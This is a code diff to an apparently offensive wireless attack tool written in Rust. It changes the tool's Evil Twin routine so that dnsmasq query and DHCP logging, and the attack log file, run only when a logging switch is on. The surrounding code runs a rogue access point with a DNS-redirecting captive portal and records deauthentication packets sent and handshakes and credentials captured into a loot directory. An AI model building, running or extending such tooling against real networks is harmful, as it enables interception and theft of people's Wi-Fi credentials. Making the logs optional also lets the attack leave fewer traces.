@@ -359,6 +359,13 @@ impl EvilTwin {
     fn start_dnsmasq(&mut self) -> Result<()> {
         let conf_path = format!("{}/dnsmasq.conf", self.config.capture_path);
         let iface = &self.config.ap_interface;
+        let logging_enabled = crate::logs_enabled();
+
+        let dnsmasq_logging = if logging_enabled {
+            "            log-queries\n            log-dhcp\n"
+        } else {
+            ""
+        };
 
         let config = format!(
             "interface={}\n\
@@ -366,11 +373,11 @@ impl EvilTwin {
             dhcp-option=3,192.168.4.1\n\
             dhcp-option=6,192.168.4.1\n\
             server=8.8.8.8\n\
-            log-queries\n\
-            log-dhcp\n\
+{dnsmasq_logging}\
             listen-address=192.168.4.1\n\
             bind-interfaces\n",
-            iface
+            iface,
+            dnsmasq_logging = dnsmasq_logging
         );
 
         // If captive portal, redirect all DNS to us
@@ -667,31 +674,38 @@ where
     let mut attack_config = config.clone();
     attack_config.capture_path = loot_dir.to_string_lossy().to_string();
 
-    // Create attack log
-    let log_path = loot_dir.join("attack.log");
-    let mut log_file = fs::File::create(&log_path)
-        .map_err(|e| WirelessError::System(format!("Failed to create log: {}", e)))?;
+    let logging_enabled = crate::logs_enabled();
 
-    writeln!(log_file, "Evil Twin Attack Log").ok();
-    writeln!(log_file, "Started: {}", Local::now().format("%Y-%m-%d %H:%M:%S")).ok();
-    writeln!(log_file, "Target SSID: {}", config.ssid).ok();
-    writeln!(log_file, "Channel: {}", config.channel).ok();
-    writeln!(log_file, "AP Interface: {}", config.ap_interface).ok();
-    writeln!(
-        log_file,
-        "Mode: {}",
-        if config.open_network {
-            "Open (Captive Portal)"
-        } else {
-            "WPA2"
+    // Create attack log when enabled
+    let (log_path, mut log_file) = if logging_enabled {
+        let path = loot_dir.join("attack.log");
+        let mut file = fs::File::create(&path)
+            .map_err(|e| WirelessError::System(format!("Failed to create log: {}", e)))?;
+
+        writeln!(file, "Evil Twin Attack Log").ok();
+        writeln!(file, "Started: {}", Local::now().format("%Y-%m-%d %H:%M:%S")).ok();
+        writeln!(file, "Target SSID: {}", config.ssid).ok();
+        writeln!(file, "Channel: {}", config.channel).ok();
+        writeln!(file, "AP Interface: {}", config.ap_interface).ok();
+        writeln!(
+            file,
+            "Mode: {}",
+            if config.open_network {
+                "Open (Captive Portal)"
+            } else {
+                "WPA2"
+            }
+        )
+        .ok();
+        if let Some(ref bssid) = config.target_bssid {
+            writeln!(file, "Target BSSID: {}", bssid).ok();
         }
-    )
-    .ok();
-    if let Some(ref bssid) = config.target_bssid {
-        writeln!(log_file, "Target BSSID: {}", bssid).ok();
-    }
-    writeln!(log_file, "Duration: {:?}", config.duration).ok();
-    writeln!(log_file, "---").ok();
+        writeln!(file, "Duration: {:?}", config.duration).ok();
+        writeln!(file, "---").ok();
+        (path, Some(file))
+    } else {
+        (PathBuf::new(), None)
+    };
 
     // Create and run attack
     let mut attack = EvilTwin::new(attack_config);
@@ -724,13 +738,15 @@ where
     let _ = progress_thread.join();
 
     // Log results
-    writeln!(log_file, "---").ok();
-    writeln!(log_file, "Attack completed").ok();
-    writeln!(log_file, "Duration: {:?}", stats.duration).ok();
-    writeln!(log_file, "Clients connected: {}", stats.clients_connected).ok();
-    writeln!(log_file, "Handshakes captured: {}", stats.handshakes_captured).ok();
-    writeln!(log_file, "Deauth packets sent: {}", stats.deauth_packets).ok();
-    writeln!(log_file, "Credentials captured: {}", stats.credentials_captured).ok();
+    if let Some(log_file) = log_file.as_mut() {
+        writeln!(log_file, "---").ok();
+        writeln!(log_file, "Attack completed").ok();
+        writeln!(log_file, "Duration: {:?}", stats.duration).ok();
+        writeln!(log_file, "Clients connected: {}", stats.clients_connected).ok();
+        writeln!(log_file, "Handshakes captured: {}", stats.handshakes_captured).ok();
+        writeln!(log_file, "Deauth packets sent: {}", stats.deauth_packets).ok();
+        writeln!(log_file, "Credentials captured: {}", stats.credentials_captured).ok();
+    }
 
     progress(&format!(
         "Evil Twin complete: {} clients connected, {} handshakes",
